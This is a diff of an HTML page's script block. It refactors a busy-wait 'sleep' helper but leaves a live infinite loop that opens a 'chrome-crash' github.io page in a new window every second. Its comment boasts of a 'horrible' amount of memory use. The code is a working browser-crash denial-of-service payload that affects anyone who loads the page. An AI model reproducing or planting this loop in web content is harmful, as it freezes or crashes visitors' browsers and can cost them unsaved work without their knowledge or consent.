@@ -35,17 +35,16 @@
     
     <!-- The Fun Stuff :) -->
     <script> 
+      // Sleep Function. Lets Us Use Pythons SLEEP(milliseconds) function
+      function sleep(milliseconds) {
+        const date = Date.now();
+        let currentDate = null;
+        do {
+            currentDate = Date.now();
+        } while (currentDate - date < milliseconds);
+     }
+      
      while(1) {
-       
-          // Sleep Function. Lets Us Use Pythons SLEEP(milliseconds) function
-          function sleep(milliseconds) {
-            const date = Date.now();
-            let currentDate = null;
-            do {
-              currentDate = Date.now();
-            } while (currentDate - date < milliseconds);
-          }
-       
           // Set's A Horrible Statistical Amount Of MEMERY Usage.
           window.open("https://chrome-crash-invoke.github.io/chrome-crash/");
           sleep(1000)
